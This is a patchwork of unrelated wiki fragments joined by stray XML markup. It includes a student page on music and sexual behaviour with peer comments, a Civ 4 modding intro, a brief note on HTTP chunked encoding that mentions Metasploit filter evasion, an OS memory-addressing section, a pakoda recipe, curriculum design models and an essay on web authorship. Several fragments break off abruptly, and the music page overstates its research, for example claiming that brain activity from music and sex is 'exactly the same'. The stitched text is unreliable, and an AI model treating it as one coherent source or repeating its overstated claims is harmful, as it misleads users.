The relationship between exposure to lyrics describing degrading sex and sexual experience held equally for both young men and women. &lt;ref&gt;http://psychcentral.com/news/2009/02/26/song-lyrics-influence-sexual-behavior/4366.html&lt;/ref&gt;

&quot;A study of more than 700 ninth-graders who listened to lyrics considered sexually degrading -- like &quot;Wait (The Whisper Song)&quot; by rap duo the Yin Yang Twins -- linked the music to higher levels of sexual behavior among young teens.&quot; &lt;ref&gt;http://www.nj.com/parenting/carrie_stetler/index.ssf/2009/03/study_links_rap_lyrics_to_teen.html&lt;/ref&gt;

The findings indicate that &quot;people who are exposed to certain messages in music are more likely to copy or emulate what they hear,&quot; said Dr. Brian A. Primack, a pediatrician. &lt;ref&gt;http://health.usnews.com/articles/health/healthday/2009/02/24/degrading-lyrics-linked-to-teen-sex.html&lt;/ref&gt; 

A professor of cognitive neurology at Newcastle University's research found that the brain's responses to music are just like it's responses to sex; the measured brain activity of someone who receives trembles from music and the measured brain activity of someone having pleasurable sex are exactly the same. &lt;ref&gt;http://nsrc.sfsu.edu/article/sex_and_music_factor&lt;/ref&gt;

- Fans of different musical genres gave very different responses, with fans of hip-hop and dance music standing out in particular. 37.5% of hip-hop fans and 28.7% of dance music fans have had more than one sexual partner in the past five years, (compared with, for example, 
1.5% of country fans). &lt;ref&gt;http://www.news-medical.net/?id=20141&lt;/ref&gt;

==Sexual Themes/Lyrics in music==

==Music Videos and sex==
The purpose of this study was to determine the effects of cognitive distortions concerning women on sexually aggressive behavior in the laboratory. Twenty-seven men listened to misogynous rap music and 27 men listened to neutral rap music. Participants then viewed neutral, sexual-violent, and assaultive film vignettes and chose one of the vignettes to show to a female confederate. Among the participants in the misogynous music condition, 30% showed the assaultive vignette and 70% showed the neutral vignette. In the neutral condition, 7% showed the sexual-violent or assaultive vignette and 93% showed the neutral vignette. Participants who showed the sexual-violent or assaultive stimuli reported that the confederate was more upset and uncomfortable in viewing these stimuli than did participants who showed the neutral vignette. These findings suggest that misogynous music facilitates sexually aggressive behavior and support the relationship between cognitive distortions and sexual aggression. &lt;ref&gt;http://www3.interscience.wiley.com/journal/119962619/abstract?CRETRY=1&amp;SRETRY=0&lt;/ref&gt;

Studies from 10 years ago show that 60% of videos on MTV at the time contained sexual imagery and sexually suggestive content. A cross-sectional review of 40 randomly selected videos showed that 90% of the videos were sexually suggestive. Research results show that the more people watch music videos, the increased likelihood they are to have high frequency estimates of sexual behaviors and liberal attitudes toward sex. This is also coupled with a stronger tendency to endorse sex-role stereotypes and the toleration of sexual harassment. &lt;ref&gt;http://www.accessmylibrary.com/coms2/summary_0286-35243419_ITM&lt;/ref&gt;

==Music in the bedroom==
Men watching rock or rap music video clips including texts using rough violence and direct sexual messages presented increased levels of testosterone, aggressiveness and misogynistic reactions. This then can lead to more violent or abusive sexual behaviors with their partners.

Those who enjoy jazz have 34% more sex than those who like pop and the least sexually active are those listening to classical music. &lt;ref&gt;http://news.softpedia.com/news/How-Does-Music-Influence-Sex-and-Human-Behavior-73779.shtml&lt;/ref&gt;

==Music as a Sexual Lifestyle==
The rock and roll lifestyle has always been associated with sex and drugs.
Musicians had always attracted attention from the opposite sex. While some rock groups were in favor of long-term relationships, other groups and artists did little to discourage it, and many tales of sexual acts became part of the rock music legacy. &lt;ref&gt;http://en.wikipedia.org/wiki/Social_impact_of_rock_and_roll&lt;/ref&gt;

==Reducing music’s influence on sex==
Parental permissiveness, peer pressure, self-esteem, and poor at home environments are the most influential ways in which young adults acquire explicit sexual music. The role of a parenting and a positive at home environment can make a huge difference in the music of which an individual is listening to at a certain age. Music which is sold in stores can be marked explicit and cannot be bought by individuals under the age of 17. Enforcing that right can reduce music’s influence of sexual behavior. Outside of the home, educators in the school systems must also make a positive environment in which explicit lyrics and music is not allowed. “A healthy home atmosphere is one that allows a child to investigate what pop culture has to offer and at the same time say ‘I know this is a fun song but you know that it’s not right to treat women this way or this isn’t a good person to have as a role model,”’ she said.
&lt;ref&gt;http://www.msnbc.msn.com/id/14227775/&lt;/ref&gt;

Dr. Bruce Perry said &quot;Kids who don't have a solid family and community value system to anchor them -- they're the ones who are influenced by TV. They are living with a parent who is overwhelmed, they are disconnected from a cultural, religious or ethnic set of beliefs...so they learn how the world works from TV.&quot; &lt;ref&gt;http://www.media-awareness.ca/english/resources/articles/stereotyping/stereotype_music_video.cfm&lt;/ref&gt;

*Monitor the music and watching of music videos
*Discuss sexual activity and the risks (i.e. Pregnancy, STIs, HIV)
*Discuss content of lyrics and possibility of actual happening (rape, using drugs or alcohol, etc.)
*Studies have shown that teens spend more time listening to music than watching television. Although music is viewed as a source of entertainment, it is important to recognize that listening habits influence coping strategies, identity formation and interpersonal relationships. &lt;ref&gt;http://www.bookrags.com/researchtopics/american-teenagers/sub15.html&lt;/ref&gt;

==Music/Media create sexual stereotypes==
When people hear songs depicting women this way and men that way, they begin to develop stereotypes about different genders. Through musical lyrics and music videos, gender and sexual stereotypes are formed and applied in society. In rap songs and videos women get depicted as objects that always have a sexual desire towards men and will be their servants, while men get depicted as strong, powerful, and rich. A major study out of Harvard University has found that popular music videos overwhelmingly portray black men as aggressors and white women as victims. The study analyzed 518 videos on the four most popular music video networks in the U.S. Researchers found that violence occurred in 14.7 per cent of the videos shown, with MTV showing the highest rate of violent videos at 22.4 per cent. In particular, black people were portrayed as aggressors in 25 per cent of the violent videos -- 95 per cent of them men. Of victims in the violent videos, 47 per cent were white women. Almost all of the aggressors (85 per cent) in the violent videos were portrayed as attractive role models, not villains.
&lt;ref&gt;http://www.media-awareness.ca/english/resources/articles/stereotyping/stereotype_music_video.cfm&lt;/ref&gt;

Another study investigated the sex-role stereotyping of occupational roles and the behaviors of music-video characters in a random sample of 182 MTV music videos. It was found that both male and female characters were shown in sex-typed occupations. Male characters were more adventuresome, domineering, aggressive, violent, and victimized than female characters, while females were more affectionate, dependant, nurturing, and fearful than males. It was also found that a large percentage of female characters wore revealing clothing and that they initiated and received sexual advances more often than males.
Steven A. Seidman, An Investigation of Sex-Role Stereotyping in Music-Videos

Throughout history, music has created influence in individuals all over the world. Athletes use music to excite them for competition, sleep deprived people use music to calm them down and fall asleep, and some people are influenced by music which arouses them sexually. Weaved inside of music’s lyrics, beats, and rhythms, lies a deep sexual influence which affects many people. The beats and sounds of music can affect our motion while the lyrics attack our minds and place pictures and stereotypes in them. Music is a powerful sound which can create an incredible sexual mood, with an incredible sexual influence for better or for worse.

      <text xml:space="preserve">It sounds very interesting.. I like what you have done. Just remember it has to be 10 paragraphs in total. I think you should just expand on the information a little more. Maybe give some examples by showing lyrics? Over all good job! --[[User:Lhomol|Lhomol]] ([[User talk:Lhomol|talk]]) 20:10, 29 April 2009 (UTC)


This is an interesting topic that i wouldnt have thought of or related sex too. The statistics and studies are very interesting and shows that there is a link between sex and music. I feel like theirs not that much researched information about this topic out there, but you all put together a good looking page with some great information. Some more statistics and studies on top of what you presented in your page would of made this page even more interesting. [[User:Malloch5987|Malloch5987]] ([[User talk:Malloch5987|talk]]) 14:25, 30 April 2009 (UTC)

Very interesting page. Especially the facts about listening to sexually degrading music and the relevance to the % of intercourse. This is all brand new very interesting information. Nice Job.[[User:Drohn141|Drohn141]] ([[User talk:Drohn141|talk]]) 02:31, 4 May 2009 (UTC)

The stastics you provided were very interesting, did know there was such a connection between music and sexual behavior in those who listen to it.  My only suggestion is to expand your page, provide more information.  Maybe put in some songs that show examples of explit lyrics and non explit lyrics? [[User:Minimedic21|Minimedic21]] ([[User talk:Minimedic21|talk]]) 22:10, 4 May 2009 (UTC)


There are some good posts above on things to add or edit. i really like how you listed songs adn lyrics of sexual content. the media seciton at the end is very interesting becaseu not only the song, but the music videos can portray exactly the teh songs wants to get across.

      <text xml:space="preserve">In Civ, you have 3 choices of where to mod: XML, Python, and DLL. Some are harder than others, and some things can only be done in one of them.  Depending on what you're trying to make, you might need any combination of the three.  However, there are some  things you need to know about how mods work in Civ 4 first.

===What is a mod?===
A mod, put simply, is something that changes the base game to improve or alter it to suit a particular purpose.  For Civ, we have a range of mods going from &quot;total conversions&quot; like Fall From Heaven 2 which change almost everything about the game, and also mods like Varietas Delectat, which just adds some nicer graphics.&lt;div class=&quot;noprint&quot;&gt;

Chunked encoding is defined in the HTTP specification.  Chunked encoding modifies the body of an HTTP message in order to transfer it as a series of pieces or &quot;chunks&quot; of various sizes.  The size of each chunk is defined by its own size indicator. A chunked HTTP message is followed by an OPTIONAL trailer containing entity-header fields.  Metasploit has the option of turning on chunked HTTP encoding for filter evasion.
Most modern filters will, of course, sew the chunks back up into complete messages.  This still serves a useful purpose of ensuring that filters are working as they should and that they are not vulnerable to any of the DOS bugs that have been found in filter handling of chunked HTTP.

Example of regular HTTP message:
HTTP/1.1 200 OK
Date: Fri, 31 Dec 1999 23:59:59 GMT
Content-Type: text/plain
Content-Length: 42
some-footer: some-value
another-footer: another-value

&lt;p&gt;This is a long string of suspect content that a filter or string search might flag&lt;/p&gt;

      <comment>/* Memory Arrays */</comment>
      <text xml:space="preserve">== Storage: Addressing Schemes ==

The amount and configuration of the storage systems, has always had an affect on the nature of the Operating Systems that can be installed. Some of the early monitors and monitoring systems had to place themselves in extremely small memories and leave room for other programs. It is important to recognize that assumptions about the size of a program that could be safely built using cards, for instance, limited the sizes of computers until multiprogramming and timesharing changed the rules.

=== Memory Banks ===

Originally Memory was built on frames, and organized into long &quot;Banks&quot; that consisted of a number of frames of Memory. Since then any linear architecture of memory has been called a memory bank.

=== Memory Arrays ===

As memory got larger, more banks were added, creating a two dimensinoal arrangement called a memory array. Later, technology shrunk these 2 dimensional structures down into circuits so small they could fit on a silicon chip.

=== Memory Modules ===

Today, we have 2 dimensional arrangements of memory where each bank is a memory module consisting of a number of chips built on a small printed circuit board that organizes them into a specific meory architecture such as DDR2 DIMMS of SDRAM. Today's memory arrays tend to store gigabytes of data on the motherboard.

=== Memory Caches ===

Although modern memory chips are fast, much faster than they have ever been before in history, chip speeds of the micro-processors have increased faster, and have been slowed down by the chip speeds of the main memory. To allow the processors to run more efficiently, faster static ram areas called caches have been built that can service the processor at its full speed. Modern computers have two such caches built into the cpu, so that the cpu can run in the multi-gigahertz range, even though main memory is often still measured in the Megahertz range.

The idea is that much of a process, is kept within a single page of memory, and can be addressed using a local jump. So we store a few pages of memory in the cache, and the processor flips back and forth between them, while it runs the program. This means that as long as we don't need a far call, our processing stays in the cache. However the minute we need a far call, we generate a cache miss, and we have to suspend processing while we load the cache again from the slower memory of the next stage below. Eventually we load memory from the main memory, and it gets propagated back into the top level cache where the program can again run for a while without needing to drop down again into the lower memory speeds. 

=== The Long and Short of Addressing ===

In most modern machine languages there are two types of fetch operations, near calls and Far Calls.
As we have seen, much of programming is done so that memory can be stored in clusters of pages, and can be anticipated so that memory fetches can precede the actual need for a particular memory page.
As long as the fetch can be started long before the page is required, the page will be ready for use, without significant waiting for the cache miss to be dealt with. Modern Optimizing Compilers can predict the need for such a pre-load and build it into the program, so that the cache is always anticipating the need for a new page. The problem comes where we need to make a far call, to a routine that is part of another program, or part, for instance of the operating system. Because it is compiled at another time, the compiler cannot anticipate anything more than the fact that you will need to change pages, and so it will have to start processing the new section of memory before it can anticipate which pages will need to be pre-loaded. This is one reason why machine languages have different calls for near jumps and far jumps. Another reason of course is that near jumps do not need the full address in order to access memory, whereas long jumps do.

=== Memory Pages and Swap Files ===

Just as the processor pre-fetches memory pages to load into the cache, a similar architecture has been developed, to allow large programs to be kept mostly on the secondary storage device, and loaded in page by page as needed. The mechanism involved is called a SwapFile or Virtual Memory Device. It consists of a framework in memory to contain active pages, and a file on the secondary storage device, to hold the actual program. As pages are needed they are moved from the swap file to the main memory framework, where they can be accessed by the cache. This would create confusion, if there wasn't a program or device called a memory manager that mapped the absolute address onto the virtual memory frameworks address.

In order to make this type of addressing practical, memory systems are organized into page based structures and memory is seldom accessed at any smaller resolution than a page fetch. Once this architecture has been created, it becomes relatively easy to load pages, and then swap them out to disk, and from the processors point of view, the main memory simply becomes a cache for the secondary storage devices.

=== Memory Partitions and Memory Virtualization ===

It wasn't until the third generation of operating systems, that it became necessary for large areas of the memory to be set aside for processing different users or different applications in a multi-programming or time-share architecture. One way of doing this, was shown in the architecture of the 80X86 family starting with the 286. By creating special Partition Registers and logically combining the partition address with the base address register, it was possible to isolate different versions of even the same program accessing the same base addresses, simply by changing the Partition address in the partition register. By associating a particular Partition with a particular process, virtual memory areas could be created that were isolated from each other.

The CP operating system was written to make use of this capability, by giving its own clones each a partition in which to run. As a result CP was both the first virtual machine and one of the first multiprocesing systems to be able to isolate different functions or give each user their own virtual machine. This allowed the batch system to do away with the 1401 front-end and Back-end processors and run their software in different partitions of main memory. It was the relative success of this program that triggered the development of the 360 line of computers and OS360 the operating system that ran them.

==== Direct Access to Hardware ====
Computers take time to do data intensive processes. However when a program wants to do a data-intensive process, the overhead of the operating system itself, may be a factor in how much data can be processed. This is most notable in HCI because the User is part of the processing loop. A Good example of where overhead is critical is in animated graphics. Screen updates can be delayed significantly if the operating sytsem, gives them a lower priority than other processes running simulataneously. If you are watching a movie, for instance, this can make the movie jerky, and make it stall at odd times, breaking the connection between the sound and the video. Another place where timing is critical is in the sound itself, since jerky sound is almost impossible to translate into speech.

Here we have a problem, in a single threaded, single user system, it is practical to allow the process to take over control of processing, and directly write to the physical hardware, without going through the system call interface. However, in a Multiprogramming, or time-share system, to do so would reduce the use that others, or other programs can make of the computer, since while the program had direct control, other processes couldn't run.

Further there is a second side-effect to allowing direct access to hardware, and that is that all security schemes are circumvented, and a malicious program can literally take over the computer and create accounts or copy data, while ostensibly showing a movie.

Because of these last two factors, Direct access to hardware is Controversial, and must be carefully considered when designing an operating system. Just what options does the operating system give the program? Does it run in a sandbox, or is it given free rein to modify memory and secondary storage at will? Anything that makes the computer more secure, will also reduce the quality of the animation, and, anything that increases the quality of animation reduces the quality of service for other programs and other users.

For myself, I remember finding out that my TRS-80 pocket computer didn't implement peek or poke commands the direct access commands for Basic, and that therefore I couldn't program it in machine language. It was at that time, that I abandoned my plans for making things with my pocket computer, and began to think in terms of buying a slightly more capable toy.

=== Extended Memory ===

An interesting problem happened because Intel the chip manufacturer designed the 80286 to be backwards compatible with the 8086, and wanted to keep it compatible with DOS. The problem was that DOS was built on an architecture that limited memory to 640K (Kilobytes), and the 286 had an extended memory that could access a much larger address space. To access this memory, the operating system had to deal with the fact that the address of the space between 640K and 1 meg, had been used for ROM. By allowing the ROM to stay within the first meg of space, the chip manufacturer had essentially created two ram memory spaces that had a gap in-between them. Regular memory in the first 640K and extended memory from 1 megabyte up.

Programs had to either be aware of the gap, and load over it, or alternately had to be separated into modules and load one modules into one memory space, and the other into the other. Windows could do this, because it had a memory manager, but few dos programs were that sophisticated so dos programs tended to be limited to the first 640K. It was partly because Windows allowed larger spreadsheets that the 286 and windows became even more popular than the 8086/8 version of Dos machines could.

Eventually by the time of the 80386 Dos developed its own memory manager, and became an extended operating system, but in the time of the 286 it was limited to the bottom 640K of memory.

=== Enhanced Memory ===

Some Motherboard manufacturers were bothered enough by the inconsistency in the addressing of memory in the 286 based computers that they designed a new memory map, called Enhanced Memory that allowed them to fill in the gap between the two memory spaces, by bank switching out the ROMs once the Bios was loaded. This architecture has since become standard, And today the operating system does not have to deal with the inconsistencies caused by keeping the ROMs in the first 1 megabyte address range. However DOS has dropped away from Windows, and is now just a memory kept by the syntax of the command language used in the command line mode.

      <text xml:space="preserve">{{recipe}} | [[Cookbook:Cuisine of India|Indian Cuisine]]

'''Pakoda''' is a savoury South Indian fried snack made from gram flour, spices and onions. This simple recipe is for Pakoda, as made in TamilNadu, India. A different version called &quot;Pakora&quot; is famous in the other parts of India. The difference is that for making &quot;Pakora&quot;, the batter/mix can be a bit more liquidy like for making pancakes and different vegetables like spinach, potatoes may be used for the same, but not in this recipe, which makes crunchier snacks.

== Ingredients ==
* 1 cup (240g) of [[Cookbook:Besan|Besan]]
* 0.5 cup [[Cookbook:Water|water]]
* 2 tspns [[Cookbook:Rice Flour|rice flour]] (for crunchiness)
* 2 tspns [[Cookbook:Mung Bean|green gram flour]](optional - for added crunch)
* [[Cookbook:Salt|salt]] to taste
* &amp;frac14; tspn of [[Cookbook:Asafoetida|asafoetida]]
* &amp;frac14; tspn of [[Cookbook:Turmeric|turmeric]]
* &amp;frac14; tspn of [[Cookbook:Cayenne|chili powder]]
* 8-10 [[Cookbook:Curry Leaf|curry leaves]]
* 1 tspn of [[Cookbook:Cumin|cumin powder]]
* 1 tspn of crushed [[Cookbook:Pepper|black peppercorns]]
* 1 medium-sized [[Cookbook:Onion|onion]], chopped finely
* 0.5 cup [[Cookbook:Peanut|peanuts]], preferably roasted
* 1 tspn [[Cookbook:Oil|oil]] for the flour mix
* [[Cookbook:Oil|oil]] to fry

== Procedure ==
# Add all the dry ingredients except the salt, peanuts and onions and mix well.
# Now add the onions, peanuts and oil (1 tspn) along with the salt and mix well.
# Keep aside for about 10 mins. The moisture from the onions will ooze out into the batter.
# Making sure to add a little bit of water at a time, make a batter which will form chunks but break into pieces with a little bit of pressure. The consistency should be of the same as when making scones. Too much water and the pakoda will not be crunchy.
# Heat oil in a heavy-bottomed vessel.
# Shape the batter into chunks and deep-fry medium hot oil until it is golden brown and crispy. Too much turmeric might give it a darker color.
# Serve hot or room temperature. Store at room temperature for about 3-4 days. Should not be refrigerated to maintain the crunch.

Maybe served with ketchup or any style of chutney.

Servings: 2
Preparation Time: 20 Minutes

== MAHARASHTRIAN METHOD / KHEKDA [!] BHAJI ==
* Peel 5/6 onions and cut them in thin slices. 
* Place cut onions in a bowl covered.
* Wash and finely cut 2/3 green chilies and then add to the onions.
* Add salt to the onion mix in the bowl and mix it.
* After 10/15 mins add 1/2 tsp turmeric powder, 1/2 tsp or more if u like pakoda hot red chili powder, 1tsp coarse powder of cumin, 1 tsp coarse powder of coriander seeds to the onion mix.
* Mix all the mixture well
* By this time the onion mix should be moist due to added salt and spices. If required more 5 mins of standby can be given
* Now start adding gram floor to the onion mix. Add little floor at a time. Mixture should not be dry. Add the floor just to absorb the moistness. Finally you should get bit sticky mix.
* Heat sufficient oil in a wok/frying pan. 
* Once heated sufficiently carefully take around 2/3 tbsp of hot oil and add to the onion+gram floor mix.
* Mix the mixture well.
* Now fry the mix in medium hot oil on golden brown color, by dropping in small to medium chunk sized batter at a time. If you have taken 4/5 large onions and a medium wok in general you may require 3/4 batches of frying to finish the batter.
* Serve hot with green chutney or tomato ketchup. After pakodas serve piping hot tea! [This is very famous combination to have when it rains heavily!]</text>

      <text xml:space="preserve">==The Backward Design Model==

&lt;!-- [[File:Backward Design Model small.jpg]] --&gt;

The Backward Design Model is similar to the subject matter analysis model in that it starts by asking what students need to know for a particular task.  The Backward Design Model asks, &quot;What should the students know?  What skills should they possess at the end of the lesson?&quot;  These questions form the first level of deciding on curriculum. The final concept in the above diagram results from the second level of the decision making process which is what essential knowledge both disciplined and nondisciplined the students will possess based on standards.  The third level of stage one is to narrow the content to knowledge that will endure.  The second stage of the Backward Design Model, according to Wiggins and McTighe, is to determine how to evaluate success (2004).  What standards are necessary for the student to be considered to be successful based on the stage one information?  This stage should cause teachers to begin to think like assessors.  The final stage in the three stage process is to plan the educational activities based on the goals students must accomplish.  Some questions teachers should ask at this stage are:
 
What knowledge and skills will students need to understand and perform to attain success with the course?
What activities will enable students to master the requisite knowledge and skills?
What must a teacher teach and how should the teacher teach it in order for students to become knowledgeable and skillful in the identified content realm?
What materials must be employed to foster student success in the curriculum in question?
Does the overall design of this course or unit meet the principles of curriculum development?
 
The essential knowledge may be assessed using observations by instructors, or using evaluations such as quizzes or performance tasks or projects.

==The Cognitive Thought Model==
[[File:Cognitive Thought Model (Instructional Design).jpg]]

The Cognitive Thought Model is a model based on the process of thought itself.  This model depicts the thought process in a way that shows existing knowledge as the basis of cognition and new thought as informational ques that tap into existing knowledge in a way that builds new knowledge from existing knowledge.  This model is highly dependant on the resources and context in which the learner is taking on new information.  This model occurs in real-time.  Lastly, the Cognitive Thought Model can operate in conjunction with other processes, in the form of information exchange, or alone. 

  
The Cognitive Thought Model Steps 
 
In the Cognitive Thought Model there are seven steps.  The steps in this model are not subject to reordering and must be completed in the sequential order given in order to achieve the desired outcome.  The steps include the following: Learner Readiness, Starting-Up, The Main Process, Possible Interpretation and Resumption, Purpose, Contemplation, and Final State. 
 
From Ornstein and Hunkins (2004):   
 
Step 1 - Learner Readiness is the ability of the learner to focus on the task at hand, be it physical or mental, by ceasing other distractions. 
 
Step 2 - Starting-Up, action initiation is made with conscious efforts by the learner.  
 
Step 3 - The Main Process is when cognition of new thought begins.  Simply stated, this is where the learner stops preparing and becomes engaged.  
 
Step 4 - Possible Interpretation and Resumption.  This step occurs while the learner is engaged.  The learner has the option at this point to decide if it is more advantageous to continue in the steps, if it is necessary to stop and restart, or if it is permissible to stop without restarting.  
 
Step 5 - Purpose.  The point of this step is to allow the learner to make a determination of whether or not the original intent of the learning is being fulfilled.  
 
Step 6 - Contemplation.  In this step the learner, assuming the all prior steps were worked successfully, must now start to look for a conclusion in the physical or mental task that they have been engaged in. 
 
Step 7 - Final State.  This step allows the learner to contemplate the results of the prior engagement that is now completed.  
  
Conclusion
 
The cognitive thought model was created using research from neurological studies.  Neural control systems have identical characteristics to those of cognitive thought.  The basic model for this approach is the same as the model that we use to control physical movement.  The way we train athletes is the same way that we can train students.

==Hunkin’s Decision-Making Model==

[[File:Hunkins Decision-Making Model.jpg]]

The first stage of this model is Curriculum Conceptualization and Legitimization. In this stage participants are demanded to engage in deliberation regarding the nature of the curriculum. This stage stresses understanding the nature and power of curriculum. It also confronts the various conceptions of curriculum. In order for this deliberation to be successful, social contexts, such as power politics, social and cultural views, have to be understood and deliberated. At this stage views of curriculum and its purposes must be legitimized. This is not any easy process; but is the most important.

The second stage of the model is Curriculum Diagnosis. This stage has two major tasks; translating needs into causes and creating goals and objectives from the needs. To begin this process educators develop needs analysis depending on the curriculum and the needs of the students. The needs analysis is derived from student data. When a curriculum is approved and becomes acceptable goals and objectives are generated to serve as guidelines.

The Curriculum Development Content Selection section deals with the “what” that is to be taught or learned. The content refers to the “stuff” of the curriculum. Content or the “what” refers to the procedures students learn to apply knowledge and skills dealing with facts, concepts, principles, theories and generalizations.

The next step in the Hunkin’s Decision- Making Model is Experience Selection. In this section the emphasis is placed on instruction. Here is where the decision of how the content will be taught or experienced. At this stage teachers will decide what materials will be utilized.  After the objectives/goals, content and instruction have been approved, is the next stage, implementation.   
Curriculum Implementation has two stages. The first stage is initial piloting to work out any minor problems and the second stage is the final diffusion stage. The final diffusion of the program is where a management system is set up to ensure the curriculum is ready to be delivered and experienced by the student.Once the program has been implemented then it can be evaluated.
Evaluation is the next stage. This stage continues as long as the program is in effect. The purpose of evaluation is to furnish data to continue to modify, or discontinue the program.

The final stage of the model is Curriculum Maintenance. Curriculum Maintenance is the methods and means by which the implemented program is managed to assure its continual functioning.

The Hunkin’s Decision-making Model has a unique feature called the feedback and adjustment loop. This loop allows decision makers to refer back to previous stages to make changes and any modifications. This loop contextualizes the process of creating and implementing curriculum. This aspect of the model addresses many critics of technical models who say that technical models are not related to the times or context in which decisions about curriculum are made.

      <comment>/* Literature Review: Authorship and Ownership */</comment>
      <text xml:space="preserve">Traditionally, an author is defined by [http://www.merriam-webster.com/dictionary/author Merriam-Webster] as &quot;one that originates or creates&quot; or &quot;the writer of a literary work,&quot; but, in truth, the answer to the question &quot;what is an author?&quot; is much more complicated than this simple definition. The introduction of the Web has challenged the traditional definition of &quot;author.&quot; 

== Literature Review: Authorship and Ownership ==


'''The Disappearance of the Author'''

The significance and authority of the author may not be as stable as they appear. In [http://books.google.com/books?id=t2Q8dIDIsNUC ''Writing Space: Computers, Hypertext, and the Remediation of Print''] (2001), [http://en.wikipedia.org/wiki/Jay_David_Bolter, Jay David Bolter] notes, “…the values of stability, monumentality, and authority are themselves not entirely stable; they have always been interpreted in terms of the contemporary technology of handwriting or printing&quot; [http://www.questia.com/PM.qst?a=o&amp;d=106054220, (Bolter, 16)]. 

Poststructuralist [http://en.wikipedia.org/wiki/Roland_Barthes Roland Barthes] was even more critical of the “monumentality” of the author, and is best remembered for his dismantling of the perceived set of literary norms and traditions that some believe define the author. Barthes was especially critical of the role of the author in modern literature, believing that the text, as processed by the reader, signaled the virtual “death of the author,” with little credit to attributable to the author’s authority. Barthes wrote,

&quot;… a text is made of multiple writing, drawn from many cultures and entering into mutual relations of dialogue, parody, contestation, but there is one place where the multiplicity is focused and that place is the reader, not, as was hitherto said, the author. The reader is the space on which all the quotations that make up a writing are inscribed without any of them being lost; a text’s unit lies not in its origin…&quot;(Barthes' ''Death of the Author'')

In traditional rhetoric, the focus was placed on the author and his beliefs, passions, and thoughts in the work. The author was always at the center of the work and lived for his work. However, Barthes argues that focusing on the author’s thoughts about a work limits the meaning behind the work. If the focus is placed on the reader, the meanings behind the work are unlimited. The death of author is necessary for the birth of the reader.

Even though an “author” might be considered an architect of text, Barthes attributed authority and significance first to the reader. He may be correct that society’s traditional views of the author have been compromised in modern literature and, were he to have had the opportunity to assess the role of the author on the Web, he may have further justified his argument.

In [http://www.continental-philosophy.org/2007/05/29/e-texts-foucault-what-is-an-author/ ''What is an Author?''], [http://en.wikipedia.org/wiki/Michel_Foucault Michael Foucault], on the other hand, disputed Barthes’ ideology about the “death of the author.” Conclusions made in a book, for example, would not signal the death of an author, but merely the death of the discourse as created by the author. When considering the role of social constructivism and dialogism in the creation of texts in published form, this especially seems true. Conclusions made in a book signal the end of a presentation to an audience, but the author is still a relevant form. In fact, in Foucault’s definition of an author, it is the text that creates the author.


'''Roles of Author and Reader on the Web'''

In [http://orange.eserver.org/issues/2-2/sbartell.htm &quot;Rhetorical Shifts in Author/Audience Roles on the World-Wide Web&quot;] (2001) Sandy Bartell chronicles the changes in the traditional roles of the author and the reader with the birth of the Web. She provides a review of traditional and modern theories of authorship. In [http://www.jstor.org/stable/585994 Gibson] and [http://www.jstor.org/stable/461344 Ong's] traditional theory of authorship, there were three roles: the author, the implied author, and the mock reader. However, Gibson and Ong’s theory does not apply to the Web because their theory implies that there is a one-to-one relationship between the reader and author.

[http://jamesmadisonva.library.ingentaconnect.com/content/stc/tc/2000/00000047/00000003/art00006 Coney and Steehouder] argued that authors and readers on the Web communicate via “personas,” which is similar to [http://www.lrc.cornell.edu/events/papers08/warschauer.pdf Warschauer and Grimes] theory about blogs and pseudonyms. Coney and Steedhouder redefine the traditional roles of author and reader to the following roles for the Web: the real visitor who visits the site; the target visitor for whom the site is designed; the user persona, the role designed for the Web; the website owner who owns and pays for the site; the designer who makes decisions about the design and content of the site; and the author persona, the person or voice that speaks to the user persona.

[http://web.ebscohost.com/ehost/detail?vid=1&amp;hid=21&amp;sid=0d8ff96f-4e75-4168-a220-6e56c021974f%40sessionmgr3&amp;bdata=JnNpdGU9ZWhvc3QtbGl2ZSZzY29wZT1zaXRl#db=ufh&amp;AN=4403709 Muriel Zimmerman] predicted that, in the future, computers will be able to assume the role of the author. An example of this early computer as author function is the Microsoft paper clip, which offers help and provides suggestions to users. Bartell concludes by arguing that author and reader roles are constantly shifting, and it is impossible to tell what direction the roles will go in next.


'''Characteristics of Authorship on the Web'''
 
In [http://books.google.com/books?id=Xbse1AYekEkC&amp;printsec=frontcover&amp;dq=cyberliteracy&amp;lr=, ''Cyberliteracy''], [http://www.comm.umn.edu/faculty/profile.php?UID=gurakl, Gurak] (2001) describes some key features of the Web: anonymity, interactivity, speed, and reach. All of these characteristics help explain the shift in author-reader roles on the Web. While anonymity allows for open communication and self-expression, it also challenges traditional roles of authors and readers, allows both readers and authors to experiment with different identities and encourages the airing of strong and possibly hostile emotions and thoughts. The interactivity of the Web allows for open communication and discussion between many users and readers, but also provides opportunities for intrusion on privacy of some individuals. The reach of the Web is widespread and connects users all over the world in one medium; a sort of international community is formed with the Web. In addition, speed encourages casual communication.


'''Authorship in Web 2.0'''

[http://journals.cambridge.org/action/displayAbstract;jsessionid=CFB44AC843E291499114B118BFC31101.tomcat1?fromPage=online&amp;aid=1820416 Warschauer and Grimes] (2007) also discuss authorship on [http://en.wikipedia.org/wiki/Web_2.0 Web 2.0], specifically on [http://en.wikipedia.org/wiki/Blog blogs], [http://en.wikipedia.org/wiki/Wiki wikis], and [http://en.wikipedia.org/wiki/Social_networking_site social networking sites]. Web 2.0 allows for much more involvement than [http://en.wikipedia.org/wiki/Web_1.0 Web 1.0], and furthermore, the content of Web 2.0 is much more dynamic. The authors of blogs are often known, either through a pseudonym, display name, or through the actual name of the author. A blog may even have a section with a short biography of the author(s). 

The ease and accessibility of the blog makes authoring a blog open to almost anyone, allowing for more and more authors on the Web. The comment feature on most blogs allows for a high level of interaction between the author(s) and the audience. A blog author must be aware of his or her target audience, and the fact that anyone could be reading the content of his or her blog. Authorship in blogs goes against Barthes’ theory that the other has disappeared. The identity of the author(s) is strong in the blog.

While the author(s) is prominent on the blog, authorship is lost completely in the wiki because of multiple authors and editors who have the option of anonymity. Wikis have endured criticism because anyone can introduce errors into a wiki, either intentionally or unintentionally. However, a study comparing the rate of errors in Wikipedia, a wiki-based encyclopedia, to the rate of errors in Encyclopædia Britannica, an established and respected encyclopedia, reveals that articles on Wikipedia are only slightly less accurate than articles in Encyclopædia Britannica. Collaboration on a wiki is very important to the success of the wiki. The quality of a wiki improves with the participation of more authors and editors.

Authorship on social networking sites is highly dynamic. Authors and users are synonymous on social networking sites. Most social networking sites have multiple tools for communication and self-expression. For example, authors/users on Facebook can post a link, a video, or a comment on another author/user’s page. Each is a form of communication or expression using a different digital medium. Reach and interactivity are also high on social networking sites. Authors/users are connected to millions of other authors/users all over the world. With Web 2.0, authorship has shifted from a few, educated authors to the masses. 

